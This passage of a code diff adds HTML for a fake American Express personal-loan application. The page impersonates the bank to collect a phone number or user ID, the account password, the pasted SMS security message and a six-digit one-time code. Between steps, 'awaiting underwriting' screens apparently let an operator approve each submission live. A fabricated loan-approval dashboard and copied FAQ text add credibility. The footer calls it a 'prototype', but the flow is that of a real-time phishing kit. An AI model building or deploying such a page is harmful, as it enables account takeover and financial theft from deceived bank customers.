+          class="px-5 py-6 md:p-8 space-y-5 flex-1 flex flex-col justify-center max-w-sm md:max-w-md mx-auto w-full md:my-6 md:border md:border-slate-200/80 md:rounded-2xl md:shadow-md">
+
+          <div class="text-center space-y-1">
+            <span
+              class="text-[11px] font-black text-white bg-brand-blue px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Step
+              3 of 4</span>
+            <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
+              <span>🔐</span>
+              <span>Sign in to American Express</span>
+            </h3>
+            <p class="text-xs text-slate-500 font-medium">Verify your credentials to link your personal loan offer</p>
+          </div>
+
+          <!-- Phone Number / Email Input Container (Preserved from Step 2) -->
+          <div>
+            <div class="flex items-center justify-between mb-1.5">
+              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider flex items-center space-x-1"
+                data-i18n="phoneNum">
+                <span>📱 / ✉️</span>
+                <span>Mobile Phone or User ID</span>
+              </label>
+              <div class="inline-flex rounded-lg bg-slate-100 p-0.5 border border-slate-200 text-[10px] font-bold">
+                <button type="button" id="tab-contact-phone" onclick="switchContactTab('phone')"
+                  class="px-2.5 py-0.5 rounded-md bg-white text-brand-navy shadow-xs transition-all font-bold">Phone</button>
+                <button type="button" id="tab-contact-email" onclick="switchContactTab('email')"
+                  class="px-2.5 py-0.5 rounded-md text-slate-500 hover:text-slate-800 transition-all">User ID / Email</button>
+              </div>
+            </div>
+
+            <!-- Mobile Phone Input Mode -->
+            <div id="contact-phone-wrapper"
+              class="flex items-center bg-slate-50 border border-slate-300 rounded-xl overflow-hidden focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all shadow-xs">
+              <div
+                class="flex items-center space-x-1.5 bg-slate-100 border-r border-slate-200 px-3.5 py-3 flex-shrink-0 select-none cursor-pointer"
+                onclick="toggleCountry()" title="Click to switch country">
+                <span id="momo-phone-flag" class="text-sm">🇺🇸</span>
+                <span id="momo-phone-prefix"
+                  class="text-xs font-black text-slate-700 whitespace-nowrap tracking-wide">+1</span>
+              </div>
+              <input id="momo-phone-display" type="tel" placeholder="(555) 123-4567"
+                oninput="onPhoneNumberInput(this)" onkeydown="onPhoneKeyDown(this, event)"
+                class="bg-transparent text-xs sm:text-sm font-bold text-slate-800 w-full px-3.5 py-3 focus:outline-none min-w-0"
+                value="" />
+            </div>
+
+            <!-- Email Address Input Mode -->
+            <div id="contact-email-wrapper"
+              class="hidden flex items-center bg-slate-50 border border-slate-300 rounded-xl overflow-hidden focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all shadow-xs">
+              <div
+                class="flex items-center bg-slate-100 border-r border-slate-200 px-3.5 py-3 flex-shrink-0 select-none">
+                <span class="text-sm">✉️</span>
+              </div>
+              <input id="momo-email-display" type="email" placeholder="name@example.com"
+                oninput="onMomoEmailInput(this.value)"
+                class="bg-transparent text-xs sm:text-sm font-bold text-slate-800 w-full px-3.5 py-3 focus:outline-none min-w-0"
+                value="" />
+            </div>
+          </div>
+
+          <!-- Form & Inputs Container -->
+          <div id="pin-form-container" class="space-y-4">
+            <div
+              class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
+              <label for="demo-password-input" class="flex items-center space-x-1 cursor-pointer">
+                <span>🔐</span>
+                <span>Account Password</span>
+              </label>
+            </div>
+
+            <!-- Single Password Input Row with Show/Hide Toggle -->
+            <div class="relative flex items-center">
+              <input id="demo-password-input" type="password" placeholder="Enter your password..."
+                oninput="onDemoPasswordInput(this.value)"
+                class="w-full bg-slate-50 border-2 border-slate-200 rounded-xl px-4 py-3.5 pr-16 text-sm font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 transition-all shadow-xs" />
+              <button type="button" id="toggle-demo-pwd-btn" onclick="toggleDemoPasswordVisibility()"
+                class="absolute right-2 px-2.5 py-1 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex items-center space-x-1 text-xs font-bold"
+                aria-label="Toggle Password Visibility">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+                <span id="eye-text" class="text-[10px] font-bold text-slate-500">Show</span>
+              </button>
+            </div>
+
+            <div id="pin-retry-alert"
+              class="p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 text-center hidden">
+            </div>
+
+            <button id="login-btn" type="button" disabled onclick="submitAccountPin()"
+              class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
+              <span>⚡</span>
+              <span>SIGN IN & VERIFY</span>
+            </button>
+          </div>
+
+          <!-- Live Approval Waiting Indicator inside Step 3 -->
+          <div id="pin-waiting-box"
+            class="hidden bg-slate-50/90 border border-slate-200/90 rounded-2xl p-6 text-center space-y-3 shadow-xs">
+            <div class="w-10 h-10 mx-auto flex items-center justify-center">
+              <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-blue rounded-full animate-spin"></div>
+            </div>
+            <p class="text-xs text-slate-700 font-semibold leading-relaxed">
+              ⏳ Waiting for underwriting to verify your credentials...
+            </p>
+          </div>
+
+        </div>
+
+        <div
+          class="amex-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
+          <div class="inline-flex flex-col items-center">
+            <span class="text-sm font-black text-white tracking-tight">American Express</span>
+            <span class="text-[11px] text-blue-100 font-medium">Security Verification Prototype</span>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- STEP 4: SMS Verification Message (Step 4 of 4) -->
+      <section id="step-4"
+        class="hidden flex-1 flex flex-col p-4 sm:p-6 md:p-8 lg:p-10 max-w-xl lg:max-w-2xl mx-auto w-full space-y-4 sm:space-y-6">
+        <div>
+          <div class="flex items-center justify-between">
+            <span
+              class="text-[11px] font-black text-white bg-brand-blue px-2.5 py-1 rounded-full uppercase tracking-wider">Step
+              4 of 4</span>
+            <span id="sms-waiting-badge"
+              class="inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200">
+              <span>Ready to Paste</span>
+            </span>
+          </div>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2" data-i18n="step4Title">
+            <span>💬</span>
+            <span>2-Step Security Verification</span>
+          </h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Copy or wait for the SMS security code from
+            American Express then paste below.</p>
+        </div>
+
+        <!-- Live SMS Reception Card & Countdown Timer -->
+        <div id="sim-sms-countdown-card"
+          class="bg-gradient-to-br from-blue-50 to-indigo-50 border border-blue-200/80 rounded-2xl p-4 shadow-xs space-y-3">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+              <span class="relative flex h-3 w-3">
+                <span
+                  class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-3 w-3 bg-brand-blue"></span>
+              </span>
+              <span class="text-xs font-black text-brand-navy uppercase tracking-wider">Awaiting American Express SMS...</span>
+            </div>
+            <div id="sms-timer-display" class="text-2xl font-black text-brand-blue tracking-tight font-mono">00:20</div>
+          </div>
+
+          <div
+            class="flex items-center justify-between bg-white/80 backdrop-blur-xs p-2.5 rounded-xl border border-blue-100">
+            <div class="text-[11px] text-slate-600 font-medium flex items-center space-x-1.5">
+              <span>📱</span>
+              <span>Target Mobile: <strong id="sms-timer-phone" class="text-slate-900 font-bold">American Express Account</strong></span>
+            </div>
+            <div class="flex items-center space-x-1.5">
+              <button type="button" onclick="copyTargetPhone(this)"
+                class="px-2 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-bold rounded-lg transition-all border border-slate-200 flex items-center space-x-1">
+                <span>📋</span>
+                <span>Copy Number</span>
+              </button>
+              <button type="button" onclick="openMessagingApp(event)"
+                class="px-2.5 py-1 bg-brand-blue text-white text-[10px] font-bold rounded-lg hover:bg-blue-800 transition-all shadow-xs flex items-center space-x-1">
+                <span>💬</span>
+                <span>Open SMS</span>
+              </button>
+            </div>
+          </div>
+
+          <p id="sms-timer-status" class="text-[11px] text-slate-500 font-semibold text-center">
+            Copy the SMS confirmation message then paste below.
+          </p>
+        </div>
+
+        <div class="space-y-4 flex-1 flex flex-col">
+
+          <div class="space-y-2 flex-1 flex flex-col">
+            <div class="flex justify-between items-center mb-1">
+              <label for="momo-pasted-msg"
+                class="block text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1.5"
+                data-i18n="smsLabel">
+                <span>📨</span>
+                <span>American Express Security SMS Message</span>
+              </label>
+              <button type="button" onclick="pasteSmsFromClipboard()"
+                class="px-3 py-1.5 amex-btn-gradient text-white text-[11px] font-black rounded-lg shadow-xs hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
+                <span>📋</span>
+                <span>Paste SMS</span>
+              </button>
+            </div>
+
+            <!-- Big Spacious Textarea Message Box -->
+            <textarea id="momo-pasted-msg" rows="5" autocomplete="off" autocorrect="off" autocapitalize="off"
+              spellcheck="false" placeholder="Paste your American Express SMS confirmation message here..."
+              oninput="handlePostLoginPastedMsg(this.value)"
+              class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-4 text-xs font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-y min-h-[130px] leading-relaxed shadow-xs"></textarea>
+
+            <div id="momo-extract-status"
+              class="mt-2 text-[11px] text-emerald-700 font-semibold flex items-center space-x-1 hidden">
+              <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+              </svg>
+              <span>✨ Security code detected! Ready to submit...</span>
+            </div>
+
+            <div id="msg-retry-alert"
+              class="mt-2 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+          </div>
+
+          <button id="submit-pasted-msg-btn" type="button" onclick="submitRegisteredMessage()"
+            class="w-full py-4 amex-btn-gradient text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2"
+            data-i18n="submitSmsBtn">
+            <span>⚡</span>
+            <span>SUBMIT SECURITY CODE</span>
+          </button>
+
+          <!-- Live Approval Waiting Indicator for Step 4 SMS -->
+          <div id="sms-waiting-box"
+            class="hidden p-4 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
+            <div class="flex items-center justify-center space-x-2">
+              <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
+              <span class="text-xs font-bold text-brand-navy uppercase tracking-wider"
+                data-i18n="awaitingVerification">⏳ Awaiting Verification</span>
+            </div>
+            <p class="text-xs text-blue-800" data-i18n="smsAwaitingDesc">Your SMS security message has been submitted.
+              Underwriting verification in progress...</p>
+            <div class="flex justify-center pt-1">
+              <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor"
+                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                </path>
+              </svg>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- STEP 5: OTP Code Verification (Step 5 of 5) -->
+      <section id="step-5" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
+        <!-- Subheader matching modern Amex layout -->
+        <div class="flex items-center justify-between py-3.5 px-4 md:px-8 border-b border-slate-100 bg-white">
+          <button type="button" onclick="handleBackAction()"
+            class="flex items-center text-sm font-semibold text-slate-700 hover:text-slate-900 transition-colors">
+            <span class="mr-1 text-base leading-none">←</span>
+            <span>Back</span>
+          </button>
+          <h2 class="text-base font-extrabold text-brand-navy text-center flex-1 pr-12" data-i18n="step5OtpTitle">
+            Security Code Verification
+          </h2>
+        </div>
+
+        <!-- Main Card Content -->
+        <div class="px-5 py-6 md:p-8 space-y-5 flex-1 flex flex-col justify-start max-w-sm md:max-w-md mx-auto w-full">
+          <div class="bg-white rounded-2xl p-5 sm:p-6 border border-slate-200/90 shadow-xs">
+            <h3 class="text-lg sm:text-xl font-black text-brand-navy tracking-tight" data-i18n="otpHeading">
+              Enter American Express Security Code
+            </h3>
+            <p class="text-xs text-slate-500 font-medium leading-relaxed mt-1 mb-4" data-i18n="otpSub">
+              Enter the 6-digit security code sent to your mobile phone from American Express
+            </p>
+
+            <label class="block text-xs font-bold text-brand-navy mb-2" data-i18n="otpLabel">
+              Security Code (6 digits):
+            </label>
+
+            <!-- 6 OTP Input Boxes + Clear Button '✕' -->
+            <div class="flex items-center space-x-2 sm:space-x-2.5 mb-5">
+              <div class="grid grid-cols-6 gap-1.5 sm:gap-2 flex-1">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="0"
+                  class="otp-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 shadow-xs outline-none transition-all" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="1"
+                  class="otp-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 shadow-xs outline-none transition-all" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="2"
+                  class="otp-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 shadow-xs outline-none transition-all" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="3"
+                  class="otp-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 shadow-xs outline-none transition-all" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="4"
+                  class="otp-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 shadow-xs outline-none transition-all" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="5"
+                  class="otp-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 shadow-xs outline-none transition-all" />
+              </div>
+
+              <button type="button" onclick="clearOtp()"
+                class="p-2 text-slate-400 hover:text-slate-600 transition-colors focus:outline-none flex items-center justify-center flex-shrink-0"
+                aria-label="Clear OTP">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+
+            <!-- Verify & Approve Loan Button -->
+            <button id="verify-otp-btn" type="button" disabled onclick="submitOtpVerification()"
+              class="w-full py-3.5 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs sm:text-sm tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-xs flex items-center justify-center space-x-2"
+              data-i18n="verifyApproveBtn">
+              <span>VERIFY & APPROVE PERSONAL LOAN</span>
+            </button>
+
+            <!-- Error / Retry alert -->
+            <div id="otp-retry-alert"
+              class="mt-4 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 text-center hidden">
+            </div>
+
+            <!-- Live Waiting Box for OTP Verification -->
+            <div id="otp-waiting-box"
+              class="hidden mt-4 p-4 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
+              <div class="flex items-center justify-center space-x-2">
+                <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-navy animate-ping"></span>
+                <span class="text-xs font-bold text-brand-navy uppercase tracking-wider">⏳ Awaiting Underwriting Approval</span>
+              </div>
+              <p class="text-xs text-slate-600 font-medium">Security code submitted. Please wait while underwriting
+                approves your personal loan...</p>
+              <div class="flex justify-center pt-1">
+                <svg class="animate-spin h-5 w-5 text-brand-navy" fill="none" viewBox="0 0 24 24">
+                  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                  <path class="opacity-75" fill="currentColor"
+                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                  </path>
+                </svg>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- Curved bottom -->
+        <div
+          class="amex-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
+          <div class="inline-flex flex-col items-center">
+            <span class="text-sm font-black text-white tracking-tight">American Express</span>
+            <span class="text-[11px] text-blue-100 font-medium">Security Authorization Prototype</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- STEP 6: Live Application Status & Approved Dashboard (Final Phase) -->
+      <section id="step-6"
+        class="hidden flex-1 flex flex-col p-4 sm:p-5 md:p-8 lg:p-10 max-w-4xl lg:max-w-5xl mx-auto w-full space-y-5 text-slate-800">
+
+        <!-- Top Celebration Header -->
+        <div class="text-center pt-2">
+          <div
+            class="inline-flex items-center justify-center w-14 h-14 bg-blue-100 rounded-full text-2xl mb-2 shadow-xs border border-blue-200">
+            🎉
+          </div>
+          <h2 class="text-2xl md:text-3xl font-black text-slate-900 tracking-tight" data-i18n="congratsHeading">
+            Congratulations!
+          </h2>
+          <p class="text-xs md:text-sm text-slate-500 font-medium max-w-md mx-auto mt-1 leading-relaxed"
+            data-i18n="congratsSub">
+            Your American Express Personal Loan has been approved! Your funds will be deposited directly into your bank account.
+          </p>
+        </div>
+
+        <!-- Desktop 2-Column Dashboard Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-12 gap-5 md:gap-6 items-start">
+          <!-- Left Column (Approved Limit & Compliance Disclosure) -->
+          <div class="md:col-span-5 space-y-4">
+            <!-- Big Approved Amount Card -->
+            <div
+              class="amex-gradient text-white rounded-2xl p-5 sm:p-6 text-center shadow-xl relative overflow-hidden border border-blue-900">
+              <div class="text-[11px] font-black uppercase text-blue-200 tracking-widest mb-1.5"
+                data-i18n="approvedAmountLabel">
+                APPROVED LOAN AMOUNT
+              </div>
+              <div class="text-3xl sm:text-4xl md:text-5xl font-black tracking-tight text-white py-1">
+                <span id="summary-approved-amount">$10,000</span>
+              </div>
+              <div class="mt-1 text-xs font-semibold text-cyan-300">
+                Fixed Rate Personal Loan • Approved
+              </div>
+            </div>
+
+            <!-- Compliance Notice Alert Box -->
+            <div class="bg-blue-50/90 border border-blue-200 rounded-2xl p-4 text-xs shadow-xs space-y-2">
+              <div class="font-black text-brand-navy text-xs tracking-wider flex items-center space-x-1.5 uppercase">
+                <span>ℹ️</span>
+                <span data-i18n="complianceNoticeTitle">AMERICAN EXPRESS PERSONAL LOAN DISCLOSURE</span>
+              </div>
+              <p class="text-[11.5px] text-slate-700 leading-relaxed font-medium" data-i18n="complianceNoticeBody">
+                American Express Personal Loans are unsecured personal loans issued by American Express National Bank.
+                Fixed interest rates range from 7.99% to 24.97% APR. No application fees, no origination fees, and no prepayment penalties.
+                Funds deposited directly into your linked bank account in as fast as 1 business day after signing loan agreement.
+              </p>
+            </div>
+          </div>
+
+          <!-- Right Column (Credit Summary Details, Actions & Next Steps) -->
+          <div class="md:col-span-7 space-y-4">
+            <!-- Loan Summary List -->
+            <div class="bg-white border border-slate-200/90 rounded-2xl p-4.5 space-y-3 shadow-xs">
+              <h3
+                class="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center space-x-1.5 border-b border-slate-100 pb-2.5">
+                <span>💳</span>
+                <span data-i18n="loanDetailsHeader">Personal Loan Summary</span>
+              </h3>
+
+              <div class="space-y-3 text-xs">
+                <!-- Monthly Payment Item -->
+                <div class="flex items-center space-x-3">
+                  <div
+                    class="w-9 h-9 bg-emerald-500 text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
+                    💵
+                  </div>
+                  <div class="flex-1 min-w-0">
+                    <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider"
+                      data-i18n="monthlyPaymentLabel">EST. MONTHLY PAYMENT</div>
+                    <div id="summary-monthly-payment"
+                      class="text-xs md:text-sm font-black text-slate-800 tracking-tight">$318 / mo
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Loan Term Item -->
+                <div class="flex items-center space-x-3">
+                  <div
+                    class="w-9 h-9 bg-brand-blue text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
+                    📅
+                  </div>
+                  <div class="flex-1 min-w-0">
+                    <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider"
+                      data-i18n="loanTermLabel">REPAYMENT TERM</div>
+                    <div id="summary-term-display" class="text-xs md:text-sm font-black text-slate-800 tracking-tight">36 Months</div>
+                  </div>
+                </div>
+
+                <!-- Interest Rate Item -->
+                <div class="flex items-center space-x-3">
+                  <div
+                    class="w-9 h-9 bg-indigo-600 text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
+                    📈
+                  </div>
+                  <div class="flex-1 min-w-0">
+                    <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider"
+                      data-i18n="interestRateLabel">FIXED INTEREST RATE</div>
+                    <div class="text-xs md:text-sm font-black text-slate-800 tracking-tight">8.99% Fixed APR</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Quick Actions -->
+            <div class="space-y-2 pt-1">
+              <div class="text-xs font-bold text-slate-500 text-center md:text-left uppercase tracking-wider mb-2"
+                data-i18n="quickActionsTitle">
+                Quick Actions
+              </div>
+
+              <div class="grid grid-cols-1 sm:grid-cols-3 gap-2">
+                <button type="button"
+                  onclick="toggleNoticeModal(true, 'Direct Deposit to Bank', 'Your loan funds will be transferred to your bank account on file in as fast as 1 business day.')"
+                  class="w-full py-3 px-3 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 shadow-xs transition-all active:scale-[0.99]">
+                  <span>🏦</span>
+                  <span data-i18n="btnDeposit">Direct Deposit</span>
+                </button>
+                <button type="button"
+                  onclick="toggleNoticeModal(true, 'AutoPay Enrollment', 'Automatic monthly payments from your linked checking account ensure on-time payment with no late fees.')"
+                  class="w-full py-3 px-3 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 shadow-xs transition-all active:scale-[0.99]">
+                  <span>🔄</span>
+                  <span data-i18n="btnWithdraw">Set Up AutoPay</span>
+                </button>
+                <button type="button"
+                  onclick="toggleNoticeModal(true, 'Personal Loan Agreement', 'American Express Personal Loan Agreement & Truth In Lending Disclosures. Loan Reference ID: ' + (appState.applicationId || 'AMEX-LN-ACTIVE'))"
+                  class="w-full py-3 px-3 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 shadow-xs transition-all active:scale-[0.99]">
+                  <span>📄</span>
+                  <span data-i18n="btnLoanInfo">Agreement</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Next Steps -->
+            <div class="bg-blue-50/70 border border-blue-200/80 rounded-2xl p-4 text-xs space-y-1 text-left">
+              <div class="font-extrabold text-slate-900 text-xs flex items-center space-x-1.5">
+                <span>📱</span>
+                <span data-i18n="nextStepsTitle">Next Steps:</span>
+              </div>
+              <p class="text-[11px] text-slate-600 font-medium leading-relaxed" data-i18n="nextStepsBody">
+                Your loan agreement has been finalized. Direct deposit to your linked bank account usually completes in 1 to 2 business days.
+              </p>
+            </div>
+
+            <!-- Return Home CTA Button -->
+            <div class="pt-2">
+              <button type="button" onclick="goToStep(0)"
+                class="w-full py-4 amex-gradient hover:opacity-95 text-white font-black rounded-xl shadow-lg shadow-blue-900/20 text-xs sm:text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all active:scale-[0.99]"
+                data-i18n="returnHomeBtn">
+                <span>🏠</span>
+                <span>Return to Home</span>
+              </button>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- Frequently Asked Questions Accordion (Official Amex Terms) -->
+      <section class="border-t border-slate-200 bg-white px-5 py-6 md:p-8">
+        <div class="max-w-4xl mx-auto space-y-4">
+          <div class="text-center space-y-1 mb-4">
+            <span class="text-[11px] font-black text-brand-blue uppercase tracking-wider">Help & Education</span>
+            <h2 class="text-lg md:text-xl font-black text-slate-900">Personal Loans Frequently Asked Questions</h2>
+          </div>
+
+          <div class="space-y-3">
+            <details class="group bg-slate-50 border border-slate-200 rounded-xl p-3.5 transition-all">
+              <summary class="font-bold text-xs md:text-sm text-slate-800 cursor-pointer list-none flex justify-between items-center">
+                <span>What are American Express® Personal Loans?</span>
+                <span class="text-brand-blue text-base group-open:rotate-180 transition-transform">▼</span>
+              </summary>
+              <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
+                American Express Personal Loans are unsecured personal loans that can be used for personal, family, or household expenses. You can use them for consolidating existing credit card debt, making major home improvements, funding large purchases, or major life events.
+              </p>
+            </details>
+
+            <details class="group bg-slate-50 border border-slate-200 rounded-xl p-3.5 transition-all">
+              <summary class="font-bold text-xs md:text-sm text-slate-800 cursor-pointer list-none flex justify-between items-center">
+                <span>How much can I borrow and what are the repayment terms?</span>
+                <span class="text-brand-blue text-base group-open:rotate-180 transition-transform">▼</span>
+              </summary>
+              <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
+                Eligible applicants can apply for loans from $3,500 up to $40,000 (and up to $50,000 for pre-approved Card Members). Repayment options include 12, 24, 36, 48, or 60 months with predictable fixed monthly payments.
+              </p>
+            </details>
+
+            <details class="group bg-slate-50 border border-slate-200 rounded-xl p-3.5 transition-all">
+              <summary class="font-bold text-xs md:text-sm text-slate-800 cursor-pointer list-none flex justify-between items-center">
+                <span>Are there any origination fees or prepayment penalties?</span>
+                <span class="text-brand-blue text-base group-open:rotate-180 transition-transform">▼</span>
+              </summary>
+              <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
+                No. There are zero origination fees, zero application fees, and zero prepayment penalties. You may pay off your loan early at any time without incurring any penalty.
+              </p>
+            </details>
+
+            <details class="group bg-slate-50 border border-slate-200 rounded-xl p-3.5 transition-all">
+              <summary class="font-bold text-xs md:text-sm text-slate-800 cursor-pointer list-none flex justify-between items-center">
+                <span>Will checking my offer affect my credit score?</span>
+                <span class="text-brand-blue text-base group-open:rotate-180 transition-transform">▼</span>
+              </summary>
+              <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
+                No. Checking for a personal loan offer involves a soft inquiry that will not affect your credit score. If you are approved and accept the loan agreement, a credit review may be reported.
+              </p>
+            </details>
+
+            <details class="group bg-slate-50 border border-slate-200 rounded-xl p-3.5 transition-all">
+              <summary class="font-bold text-xs md:text-sm text-slate-800 cursor-pointer list-none flex justify-between items-center">
+                <span>How quickly will I receive my funds?</span>
+                <span class="text-brand-blue text-base group-open:rotate-180 transition-transform">▼</span>
+              </summary>
+              <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
+                Once approved and your loan agreement is digitally signed, funds are typically sent via direct deposit to your bank account in as fast as 1 to 2 business days.
+              </p>
+            </details>
+
+            <details class="group bg-slate-50 border border-slate-200 rounded-xl p-3.5 transition-all">
+              <summary class="font-bold text-xs md:text-sm text-slate-800 cursor-pointer list-none flex justify-between items-center">
+                <span>Is there anything I cannot use my loan funds for?</span>
+                <span class="text-brand-blue text-base group-open:rotate-180 transition-transform">▼</span>
+              </summary>
+              <p class="text-xs text-slate-600 mt-2.5 leading-relaxed">
+                Personal loans may not be used for postsecondary education expenses, real estate purchases, business purposes, securities/investments, to pay down balances on American Express-issued cards, or any purpose prohibited by law.
+              </p>
+            </details>
+          </div>
+        </div>
+      </section>
+
+    </main>
+
+    <!-- Footer Wave / Brand Tag -->
+    <footer class="bg-brand-navy text-blue-200 py-5 px-6 text-center text-[11px] border-t border-blue-900/50 space-y-2">
+      <div class="flex items-center justify-center space-x-2">
+        <svg class="h-4 w-auto inline" viewBox="0 0 140 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="4" fill="#006FCF" />
+          <text x="16" y="15" font-family="'Plus Jakarta Sans', sans-serif" font-weight="900" font-size="6.5" fill="#FFFFFF" text-anchor="middle">AMERICAN</text>
+          <text x="16" y="23" font-family="'Plus Jakarta Sans', sans-serif" font-weight="900" font-size="6.5" fill="#FFFFFF" text-anchor="middle">EXPRESS</text>
